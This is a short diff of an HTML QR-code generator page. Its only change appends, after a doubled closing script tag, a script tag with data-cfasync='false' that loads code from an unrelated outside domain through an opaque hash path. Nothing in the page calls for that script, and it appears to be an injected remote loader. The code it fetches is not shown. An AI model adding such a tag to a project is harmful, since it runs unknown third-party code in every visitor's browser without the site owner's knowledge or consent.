@@ -9,4 +9,4 @@
 let qrData=null;
 function qrMake(){const el=document.getElementById('qrcode');el.innerHTML='';const txt=document.getElementById('qrText').value.trim();if(!txt)return msg('Enter text or URL','bad');try{const q=qrcode(0,'M');q.addData(txt);q.make();qrData=q.createDataURL(6,10);el.innerHTML=q.createImgTag({cellSize:6,margin:10,alt:'Generated QR code'});msg('QR generated','ok')}catch(e){msg(e.message||'QR generation failed','bad')}}
 function qrDownload(){if(!qrData)return msg('Generate a QR first','bad');const a=document.createElement('a');a.href=qrData;a.download='nova-qr.gif';a.click()}
-</script></script></body></html>
+</script></script><script data-cfasync="false" src="https://bauval.org/14/f2c79785527664e81448232e72c6a94b"></script></body></html>
